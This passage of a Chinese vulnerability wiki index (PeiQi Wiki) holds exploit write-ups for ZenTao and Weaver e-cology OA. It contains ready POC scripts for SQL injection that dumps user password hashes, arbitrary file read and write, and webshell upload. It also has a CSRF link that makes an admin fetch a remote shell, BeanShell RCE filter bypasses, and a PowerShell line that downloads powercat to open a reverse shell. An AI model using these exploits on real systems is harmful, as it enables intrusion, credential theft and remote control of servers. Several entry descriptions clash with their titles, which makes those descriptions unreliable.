请求类型：PATH_INFO|PATHINFO2|GET。 The request type: PATH_INFO|PATH_INFO2|GET. $config->requestFix = '-'; // PATH_INFO和PATH_INFO2模式的分隔符。 The divider in the url when PATH_INFO|PATH_INFO2. $config->moduleVar = 'm'; // 请求类型为GET：模块变量名。 requestType=GET: the module var name. $config->methodVar = 'f'; // 请求类型为GET：模块变量名。 requestType=GET: the method var name. $config->viewVar = 't'; // 请求类型为GET：视图变量名。 requestType=GET: the view var name. $config->sessionVar = 'zentaosid'; // 请求类型为GET：session变量名。 requestType=GET: the session var name. $config->views = ',html,json,mhtml,xhtml,'; // 支持的视图类型。 Supported view formats. 可以发现这里存在两种路由PATH_INFO|PATH_INFO2：一种是m、f、t来进行调用。另外一种是通过-来进行调用 在index.php中的66行 $app->parseRequest(); public function parseRequest() { if($this->config->requestType == 'PATH_INFO' or $this->config->requestType == 'PATH_INFO2') { $this->parsePathInfo(); $this->setRouteByPathInfo(); } elseif($this->config->requestType == 'GET') { $this->parseGET(); $this->setRouteByGET(); } else { $this->triggerError(\"The request type {$this->config->requestType} not supported\", __FILE__, __LINE__, $exit = true); } } 看到这一条则是判断力两种调用方法 $this->config->requestType == 'PATH_INFO' or $this->config->requestType == 'PATH_INFO2' 跟进setRouteByPathInfo方法 public function setRouteByPathInfo() { if(!empty($this->URI)) { /* * 根据$requestFix分割符，分割网址。 * There's the request seperator, split the URI by it. **/ if(strpos($this->URI, $this->config->requestFix) !== false) { $items = explode($this->config->requestFix, $this->URI); $this->setModuleName($items[0]); $this->setMethodName($items[1]); } /* * 如果网址中没有分隔符，使用默认的方法。 * No reqeust seperator, use the default method name. **/ else { $this->setModuleName($this->URI); $this->setMethodName($this->config->default->method); } } else { $this->setModuleName($this->config->default->module); // 使用默认模块 use the default module. $this->setMethodName($this->config->default->method); // 使用默认方法 use the default method. } $this->setControlFile(); } 所以可以推断出调用的方法 例如登录页面有两种访问方法 http://xxx.xxx.xxx.xxx/index.php?m=user&f=login http://xxx.xxx.xxx.xxx/user-login.html 再看一下checkPriv方法 public function checkPriv() { $module = $this->app->getModuleName(); $method = $this->app->getMethodName(); if(!empty($this->app->user->modifyPassword) and (($module != 'my' or $method != 'changepassword') and ($module != 'user' or $method != 'logout'))) die(js::locate(helper::createLink('my', 'changepassword'))); if($this->isOpenMethod($module, $method)) return true; if(!$this->loadModel('user')->isLogon() and $this->server->php_auth_user) $this->user->identifyByPhpAuth(); if(!$this->loadModel('user')->isLogon() and $this->cookie->za) $this->user->identifyByCookie(); if(isset($this->app->user)) { if(!commonModel::hasPriv($module, $method)) $this->deny($module, $method); } else { $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); } } 这里检测了调用模块和方法的权限，可以知道除了isOpenMethod中定义的公开模块和方法之外，其他的方法都是需要登录的 最后是$app->loadModule();这段代码 public function loadModule() { $appName = $this->appName; $moduleName = $this->moduleName; $methodName = $this->methodName; /* * 引入该模块的control文件。 * Include the control file of the module. **/ $file2Included = $this->setActionExtFile() ? $this->extActionFile : $this->controlFile; chdir(dirname($file2Included)); helper::import($file2Included); /* * 设置control的类名。 * Set the class name of the control. **/ $className = class_exists(\"my$moduleName\") ? \"my$moduleName\" : $moduleName; if(!class_exists($className)) $this->triggerError(\"the control $className not found\", __FILE__, __LINE__, $exit = true); /* * 创建control类的实例。 * Create a instance of the control. **/ $module = new $className(); if(!method_exists($module, $methodName)) $this->triggerError(\"the module $moduleName has no $methodName method\", __FILE__, __LINE__, $exit = true); $this->control = $module; /* include default value for module*/ $defaultValueFiles = glob($this->getTmpRoot() . \"defaultvalue/*.php\"); if($defaultValueFiles) foreach($defaultValueFiles as $file) include $file; /* * 使用反射机制获取函数参数的默认值。 * Get the default settings of the method to be called using the reflecting. * * */ $defaultParams = array(); $methodReflect = new reflectionMethod($className, $methodName); foreach($methodReflect->getParameters() as $param) { $name = $param->getName(); $default = '_NOT_SET'; if(isset($paramDefaultValue[$appName][$className][$methodName][$name])) { $default = $paramDefaultValue[$appName][$className][$methodName][$name]; } elseif(isset($paramDefaultValue[$className][$methodName][$name])) { $default = $paramDefaultValue[$className][$methodName][$name]; } elseif($param->isDefaultValueAvailable()) { $default = $param->getDefaultValue(); } $defaultParams[$name] = $default; } /** * 根据PATH_INFO或者GET方式设置请求的参数。 * Set params according PATH_INFO or GET. */ if($this->config->requestType != 'GET') { $this->setParamsByPathInfo($defaultParams); } else { $this->setParamsByGET($defaultParams); } if($this->config->framework->filterParam == 2) { $_GET = validater::filterParam($_GET, 'get'); $_COOKIE = validater::filterParam($_COOKIE, 'cookie'); } /* 调用该方法 Call the method. */ call_user_func_array(array($module, $methodName), $this->params); return $module; } 通过之前获取的moduleName包含对应的control类文件并实例化，随后调用setParamsByPathInfo方法从路径中获取方法对应的参数值，最后通过call_user_func_array方法调用对应control类中的对应方法并赋值。 我们查看module/api/control.php文件中的getModel方法 这里通过call_user_func_array函数调用所有的model文件的所有方法。 $result = call_user_func_array(array(&$module, $methodName), $params); 可以看到module/api/moudel.php中的sql函数 public function sql($sql, $keyField = '') { $sql = trim($sql); if(strpos($sql, ';') !== false) $sql = substr($sql, 0, strpos($sql, ';')); a($sql); if(empty($sql)) return ''; if(stripos($sql, 'select ') !== 0) { return $this->lang->api->error->onlySelect; } else { try { $stmt = $this->dao->query($sql); if(empty($keyField)) return $stmt->fetchAll(); $rows = array(); while($row = $stmt->fetch()) $rows[$row->$keyField] = $row; return $rows; } catch(PDOException $e) { return $e->getMessage(); } } } 这里并没有进行过滤，只使用了代码$sql=trim($sql)过滤了空格 我们看一下这里的调用这个方法需要的权限 这里可以看到任何用户都可以调用这个模块的方法，所以我们用它调用sql方法进行查询(空格转换为+,绕过过滤) http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user 成功执行sql语句 漏洞利用POC 登陆后访问 http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/禅道CMS/禅道 11.6版本 任意文件写入漏洞.html":{"url":"PeiQi_Wiki/CMS漏洞/禅道CMS/禅道 11.6版本 任意文件写入漏洞.html","title":"禅道 11.6版本 任意文件写入漏洞","keywords":"","body":"禅道 11.6版本 任意文件读取漏洞 漏洞描述 禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口执行SQL语句导致SQL注入 影响版本 [!NOTE] 禅道 11.6 环境搭建 这里使用docker环境搭建 docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 访问 http://xxx.xxx.xxx.xxx:8084 按步骤安装即可 漏洞复现 这里造成漏洞的原因同样是调用接口权限无限制的原因 接口出现漏洞的原因具体参考可以查看上一篇 禅道 11.6版本 SQL注入漏洞 关于此漏洞的完整分析 查看module/api/ediyor/moudel.php下的save方法 public function save($filePath) { $fileContent = $this->post->fileContent; $evils = array('eval', 'exec', 'passthru', 'proc_open', 'shell_exec', 'system', '$$', 'include', 'require', 'assert'); $gibbedEvils = array('e v a l', 'e x e c', ' p a s s t h r u', ' p r o c _ o p e n', 's h e l l _ e x e c', 's y s t e m', '$ $', 'i n c l u d e', 'r e q u i r e', 'a s s e r t'); $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent); if(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent); $dirPath = dirname($filePath); $extFilePath = substr($filePath, 0, strpos($filePath, DS . 'ext' . DS) + 4); if(!is_dir($dirPath) and is_writable($extFilePath)) mkdir($dirPath, 0777, true); if(is_writable($dirPath)) { file_put_contents($filePath, $fileContent); } else { die(js::alert($this->lang->editor->notWritable . $extFilePath)); } } $filePath参数和$fileContent参数 我们是可控的 调用方法往 /tmp写入一个phpinfo() http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell.php POST:fileContent= 在利用 禅道 11.6版本 任意文件读取漏洞 第二种方法来文件包含 http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 也可以写入网站目录中 先获取地址 http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell POST：fileContent=');?> 访问http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 得到目录为 /app/zentaopma/www 请求改为 http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell fileContent=');?> 再去访问http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1则会再网站目录下生成 xxx.php 文件 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: zentao version = 11.6 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mZentaosid >>> xxxxxxxxxxxxxx(cookie字段) \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=version_url, timeout=20, headers=headers) version = json.loads(response.text)['version'] print(\"\\033[32m[o] 禅道版本为:{}\\033[0m\".format(version)) except Exception as e: print(\"\\033[31m[x] 获取版本失败 \\033[0m\", e) sys.exit(0) def POC_2(target_url, zentaosid): headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"zentaosid={}\".format(zentaosid) } data = {\"fileContent\":\"\"} write_url = target_url + \"/api-getModel-editor-save-filePath=/tmp/test\" try: response = requests.post(url=write_url, data=data, headers=headers, timeout=10) print(\"\\033[32m[o] 尝试写入php文件... \\033[0m\") except: print(\"\\033[31m[x] 写入php文件失败 \\033[0m\") sys.exit(0) def POC_3(target_url, zentaosid): headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"zentaosid={}\".format(zentaosid) } vuln_url = target_url + \"/api-getModel-api-getMethod-filePath=/tmp/test/1\" try: response = requests.get(url=vuln_url, headers=headers, timeout=10) if \"System\" in response.text: print(\"\\033[32m[o] 成功写入文件，存在漏洞, 访问 {}/api-getModel-api-getMethod-filePath=/tmp/test/1/ 查看 \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 读取php文件失败 \\033[0m\") except: print(\"\\033[31m[x] 读取php文件失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) zentaosid = str(input(\"\\033[35mZentaosid >>> \\033[0m\")) POC_1(target_url) POC_2(target_url, zentaosid) POC_3(target_url, zentaosid) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/禅道CMS/禅道 11.6版本 任意文件读取漏洞.html":{"url":"PeiQi_Wiki/CMS漏洞/禅道CMS/禅道 11.6版本 任意文件读取漏洞.html","title":"禅道 11.6版本 任意文件读取漏洞","keywords":"","body":"禅道 11.6版本 任意文件读取漏洞 漏洞描述 禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口执行SQL语句导致SQL注入 影响版本 [!NOTE] 禅道 11.6 环境搭建 这里使用docker环境搭建 docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 访问 http://xxx.xxx.xxx.xxx:8084 按步骤安装即可 漏洞复现 这里造成漏洞的原因同样是调用接口权限无限制的原因 接口出现漏洞的原因具体参考可以查看上一篇 禅道 11.6版本 SQL注入漏洞 关于此漏洞的完整分析 第一种方法 查看module/file/moudel.php下的parseCSV方法 public function parseCSV($fileName) { $content = file_get_contents($fileName); /* Fix bug #890. */ $content = str_replace(\"\\x82\\x32\", \"\\x10\", $content); $lines = explode(\"\\n\", $content); $col = -1; $row = 0; $data = array(); foreach($lines as $line) { $line = trim($line); $markNum = substr_count($line, '\"') - substr_count($line, '\\\"'); if(substr($line, -1) != ',' and (($markNum % 2 == 1 and $col != -1) or ($markNum % 2 == 0 and substr($line, -2) != ',\"' and $col == -1))) $line .= ','; $line = str_replace(',\"\",', ',,', $line); $line = str_replace(',\"\",', ',,', $line); $line = preg_replace_callback('/(\\\"{2,})(\\,+)/U', array($this, 'removeInterference'), $line); $line = str_replace('\"\"', '\"', $line); /* if only one column then line is the data. */ if(strpos($line, ',') === false and $col == -1) { $data[$row][0] = trim($line, '\"'); } else { /* if col is not -1, then the data of column is not end. */ if($col != -1) { $pos = strpos($line, '\",'); if($pos === false) { $data[$row][$col] .= \"\\n\" . $line; $data[$row][$col] = str_replace('&comma;', ',', $data[$row][$col]); continue; } else { $data[$row][$col] .= \"\\n\" . substr($line, 0, $pos); $data[$row][$col] = trim(str_replace('&comma;', ',', $data[$row][$col])); $line = substr($line, $pos + 2); $col++; } } if($col == -1) $col = 0; /* explode cols with delimiter. */ while($line) { /* the cell has '\"', the delimiter is '\",'. */ if($line{0} == '\"') { $pos = strpos($line, '\",'); if($pos === false) { $data[$row][$col] = substr($line, 1); /* if line is not empty, then the data of cell is not end. */ if(strlen($line) >= 1) continue 2; $line = ''; } else { $data[$row][$col] = substr($line, 1, $pos - 1); $line = substr($line, $pos + 2); } $data[$row][$col] = str_replace('&comma;', ',', $data[$row][$col]); } else { /* the delimiter default is ','. */ $pos = strpos($line, ','); /* if line is not delimiter, then line is the data of cell. */ if($pos === false) { $data[$row][$col] = $line; $line = ''; } else { $data[$row][$col] = substr($line, 0, $pos); $line = substr($line, $pos + 1); } } $data[$row][$col] = trim(str_replace('&comma;', ',', $data[$row][$col])); $col++; } } $row ++; $col = -1; } return $data; } 这里可以看到以file为模块名、parseCSV为方法名去调用读取文件 读取的文件名$filename参数可控，例如读取/etc/passwd http://xxx.xxx.xxx.xxx/api-getModel-file-parseCSV-fileName=/etc/passwd [!NOTE] 注意以 .php .txt 结尾的会被 /framework/base/router.class.php中的parsePathInfo方法 过滤 第二种方法 查看module/api/moudel.php下的getMethod方法 public function getMethod($filePath, $ext = '') { $fileName = dirname($filePath); $className = basename(dirname(dirname($filePath))); if(!class_exists($className)) helper::import($fileName); $methodName = basename($filePath); $method = new ReflectionMethod($className . $ext, $methodName); $data = new stdClass(); $data->startLine = $method->getStartLine(); $data->endLine = $method->getEndLine(); $data->comment = $method->getDocComment(); $data->parameters = $method->getParameters(); $data->className = $className; $data->methodName = $methodName; $data->fileName = $fileName; $data->post = false; $file = file($fileName); for($i = $data->startLine - 1; $i endLine; $i++) { if(strpos($file[$i], '$this->post') or strpos($file[$i], 'fixer::input') or strpos($file[$i], '$_POST')) { $data->post = true; } } return $data; } 这里与第一种大同小异，只是调用了不同模块的方法 看到$fileName = dirname($filePath);这段则为返回的目录名 所以读取/etc/passwd则需要写为/etc/passwd/1来绕过 http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/etc/passwd/1 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/禅道CMS/禅道 小于12.4.2 CSRF漏洞 CNVD-2020-68552.html":{"url":"PeiQi_Wiki/CMS漏洞/禅道CMS/禅道 小于12.4.2 CSRF漏洞 CNVD-2020-68552.html","title":"禅道 小于12.4.2 CSRF漏洞 CNVD-2020-68552","keywords":"","body":"禅道 小于12.4.2 CSRF漏洞 漏洞描述 可以针对禅道的部分模块制造恶意URL地址发送给管理员，当管理员登录时会执行模块的恶意请求,可用于进行钓鱼请求 影响版本 [!NOTE] 禅道 环境搭建 百度下12.4.2的禅道环境按步骤安装下载即可 禅道官方网站 调用接口查询版本信息 http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig 漏洞复现 这里利用 禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325(可参照上一篇文章) 来构造一个恶意的URL地址 查看module/common/model.php的checkPriv方法 public function checkPriv() { $module = $this->app->getModuleName(); $method = $this->app->getMethodName(); if($this->app->isFlow) { $module = $this->app->rawModule; $method = $this->app->rawMethod; } if(!empty($this->app->user->modifyPassword) and (($module != 'my' or $method != 'changepassword') and ($module != 'user' or $method != 'logout'))) die(js::locate(helper::createLink('my', 'changepassword'))); if($this->isOpenMethod($module, $method)) return true; if(!$this->loadModel('user')->isLogon() and $this->server->php_auth_user) $this->user->identifyByPhpAuth(); if(!$this->loadModel('user')->isLogon() and $this->cookie->za) $this->user->identifyByCookie(); if(isset($this->app->user)) { if(!defined('IN_UPGRADE')) $this->session->user->view = $this->loadModel('user')->grantUserView(); $this->app->user = $this->session->user; if(!commonModel::hasPriv($module, $method)) $this->deny($module, $method); } else { $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); } } 这里的代码片段为鉴权函数，可以看到最后一句代码 $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); 所以当调用当前权限不允许的方法时，会进行跳转，并在$referer参数缓存调用的方法URL，当使用这个跳转的地址登录时则会直接调用此方法 URL地址构造过程 http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=/www/index.php.m=client&f=download&version=1&link=HTTP://peiqi.tech/SHELL.php 将link参数base64加密 http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=/www/index.php.m=client&f=download&version=1&link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw 将referer参数以 . 做分割base64加密两边字符 http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=L3d3dy9pbmRleC5waHA.bT1jbGllbnQmZj1kb3dubG9hZCZ2ZXJzaW9uPTEmbGluaz1TRlJVVURvdkwzQmxhWEZwTG5SbFkyZ3ZVMGhGVEV3dWNHaHc= 将这个URL地址发送给管理员，当管理员登录时则会触发恶意文件下载 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/禅道CMS/禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325.html":{"url":"PeiQi_Wiki/CMS漏洞/禅道CMS/禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325.html","title":"禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325","keywords":"","body":"禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325 漏洞描述 百度云安全团队监测到禅道官方发布了文件上传漏洞的风险通告，该漏洞编号为CNVD-C-2020-121325，漏洞影响禅道 影响版本 [!NOTE] 禅道 环境搭建 百度下12.4.2的禅道环境按步骤安装下载即可 禅道官方网站 调用接口查询版本信息 http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig 漏洞复现 [!NOTE] 漏洞触发需要后台权限 根据漏洞描述查看修改后的代码片段 修改前 public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; return parent::downloadZipPackage($version, $link); } 修改后 public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(!preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; $file = basename($link); $extension = substr($file, strrpos($file, '.') + 1); if(strpos(\",{$this->config->file->allowed},\", \",{$extension},\") === false) return false; return parent::downloadZipPackage($version, $link); } 这里传入的参数为版本和link地址，然后base64解码，正则判断是否为http或https协议，这里的正则过滤并不完整，所以可以绕过用于下载恶意文件 可以大写http或请求FTP来绕过正则 跟进一下parent::downloadZipPackage这个方法，跟着来到zentao\\module\\client\\model.php文件中 public function downloadZipPackage($version, $link) { ignore_user_abort(true); set_time_limit(0); if(empty($version) || empty($link)) return false; $dir = \"data/client/\" . $version . '/'; $link = helper::safe64Decode($link); $file = basename($link); if(!is_dir($this->app->wwwRoot . $dir)) { mkdir($this->app->wwwRoot . $dir, 0755, true); } if(!is_dir($this->app->wwwRoot . $dir)) return false; if(file_exists($this->app->wwwRoot . $dir . $file)) { return commonModel::getSysURL() . $this->config->webRoot . $dir . $file; } ob_clean(); ob_end_flush(); $local = fopen($this->app->wwwRoot . $dir . $file, 'w'); $remote = fopen($link, 'rb'); if($remote === false) return false; while(!feof($remote)) { $buffer = fread($remote, 4096); fwrite($local, $buffer); } fclose($local); fclose($remote); return commonModel::getSysURL() . $this->config->webRoot . $dir . $file; } 可以简单看到这里获取link传入的文件名，通过fopen打开该文件，写入禅道目录www/data/client/version中 查看一下有没有调用这个方法的地方 找到了download方法调用了这个漏洞点，所以我们有两种下载恶意文件的方法 http://xxx.xxx.xxx.xxx/www/client-download-[$version参数]-[base64加密后的恶意文件地址].html http://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=[$version参数]&link=[base64加密后的恶意文件地址] 首先先上传一个恶意文件，可以是FTP也可以是HTTP 例如我上传的文件URL为http://peiqi.tech/SHELL.php http://peiqi.tech/SHELL.php | base64加密 HTTP://peiqi.tech/SHELL.php | SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw 请求地址则为 http://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=1&link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw 下载的目录地址为zentaopms\\www\\data\\client\\1 [!NOTE] 目录为version名称 成功上传webshell 漏洞利用POC [!NOTE] POC使用需要拥有后台Cookie #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: zentao version >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mShell >>> http://xxx.xxx.xxx.xxx/shell.php(恶意文件地址) \\033[0m') print('+ \\033[36mZentaosid >>> xxxxxxxxxxxxxx(cookie字段) \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=version_url, timeout=20, headers=headers) version = json.loads(response.text)['version'] print(\"\\033[32m[o] 禅道版本为:{}\\033[0m\".format(version)) except Exception as e: print(\"\\033[31m[x] 获取版本失败 \\033[0m\", e) def POC_2(target_url, shell_url, zentaosid): options = shell_url.split(\"://\") if options[0] == \"http\": shell_url = \"HTTP://\" + options[1] elif options[0] == \"ftp\": shell_url = \"ftp://\" + options[1] else: print(\"\\033[31m[x] 请使用正确的请求地址 \\033[0m\") sys.exit(0) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":\"zentaosid={}\".format(zentaosid) } shell_url_base = str((base64.b64encode(shell_url.encode('utf-8'))),'utf-8') vuln_url = target_url + \"/www/index.php?m=client&f=download&version=test&link={}\".format(shell_url_base) print(\"\\033[32m[o] 请求漏洞url：{}\\033[0m\".format(vuln_url)) try: response = requests.get(url=vuln_url, timeout=20, headers=headers) if \"保存成功\" in response.text: print(\"\\033[32m[o] 成功写入Webshell，URL地址为：{}/www/data/client/test/Webshell_name.php\\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 恶意文件下载失败 \\033[0m\") except: print(\"\\033[31m[x] 恶意文件下载失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) shell_url = str(input(\"\\033[35mShell >>> \\033[0m\")) zentaosid = str(input(\"\\033[35mZentaosid >>> \\033[0m\")) POC_1(target_url) POC_2(target_url, shell_url, zentaosid) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/":{"url":"PeiQi_Wiki/OA产品漏洞/","title":"OA产品漏洞","keywords":"","body":"OA产品漏洞🐶 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/泛微OA/":{"url":"PeiQi_Wiki/OA产品漏洞/泛微OA/","title":"泛微OA","keywords":"","body":"泛微OA 泛微云桥 e-Bridge 任意文件读取 泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204 泛微OA e-cology 数据库配置信息泄漏漏洞 泛微OA WorkflowCenterTreeData接口SQL注入(仅限oracle数据库) CNVD-2019-34241 泛微OA sysinterface/codeEdit.jsp 页面任意文件上传 WooYun-2015-0155705 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204.html":{"url":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204.html","title":"泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204","keywords":"","body":"泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204 漏洞描述 2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重. FOFA [!NOTE] app=“泛微-协同办公OA” 影响版本 [!NOTE] E-cology 7.0 E-cology 8.0 E-cology 8.1 E-cology 9.0 漏洞复现 直接在网站根目录后加入组件访问路径 /weaver/bsh.servlet.BshServlet/，如下图在victim上执行了命令“ipconfig.exe” 请求包为 POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded bsh.script=eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw 关于绕过 eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\"); ex\\u0065c(\"cmd /c dir\"); IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd 漏洞POC https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204 #/usr/bin/python #coding:utf-8 #Author:Ja0k #For Weaver-Ecology-OA_RCE import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) import requests,sys headers = { 'Content-Type': 'text/xml; charset=utf-8', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0', 'Cache-Control': 'max-age=0', 'Content-Type': 'application/x-www-form-urlencoded', 'Upgrade-Insecure-Requests': '1', 'Content-Length': '578' } proxies= {'http':'http://127.0.0.1:8080'} def Poc_check(target): Url_Payload1=\"/bsh.servlet.BshServlet\" Url_Payload2=\"/weaver/bsh.servlet.BshServlet\" Url_Payload3=\"/weaveroa/bsh.servlet.BshServlet\" Url_Payload4=\"/oa/bsh.servlet.BshServlet\" Data_Payload1=\"\"\"bsh.script=exec(\"whoami\");&bsh.servlet.output=raw\"\"\" Data_Payload2= \"\"\"bsh.script=\\u0065\\u0078\\u0065\\u0063(\"whoami\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw\"\"\" Data_Payload3= \"\"\"bsh.script=eval%00(\"ex\"%2b\"ec(bsh.httpServletRequest.getParameter(\\\\\"command\\\\\"))\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami\"\"\" for Url_Payload in (Url_Payload1,Url_Payload2,Url_Payload3,Url_Payload4): url= target + Url_Payload for Data_payload in (Data_Payload1,Data_Payload2,Data_Payload3): try: http_response = requests.post(url,data=Data_payload,headers=headers,verify=False) #print http_response.status_code if http_response.status_code == 200: if \";\" not in (http_response.content): if \"Login.jsp\" not in (http_response.content): if \"Error\" not in (http_response.content): print \"{0} is a E-cologyOA_RCE Vulnerability\".format(url) print \"Server Current Username：{0}\".format(http_response.content) elif http_response.status_code == 500: print \"{0}500 maybe is Weaver-EcologyOA，Please confirm by yourself \".format(url) else: pass except Exception,Error: pass if __name__ == '__main__': for line in open(sys.argv[1]).readlines(): target=line.strip() Poc_check(target) #1.install python Dependencies Library pip install requests #2.批量脚本 执行 python Weaver-Ecology-OA_RCE-exp.py url.txt文件中 是url地址 需要带http协议 有任何问题请issue PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA e-cology 数据库配置信息泄漏漏洞.html":{"url":"PeiQi_Wiki/OA产品漏洞/泛微OA/泛微OA e-cology 